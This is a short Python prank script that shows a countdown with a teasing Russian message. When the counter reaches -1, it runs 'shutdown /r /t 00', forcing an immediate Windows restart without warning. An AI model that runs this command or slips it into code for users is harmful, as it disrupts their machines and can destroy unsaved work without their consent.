from time import sleep
import os


a = 1000
print(a,'- 7','Тваё время до перерождение! любя от Марселя')
sleep(3)
while a > 0:
    a = a - 7
    print(a,'- 7')
    sleep(0.1)
    if a == -1:
        restart_command="shutdown /r /t 00"
        os.system(restart_command)
print('')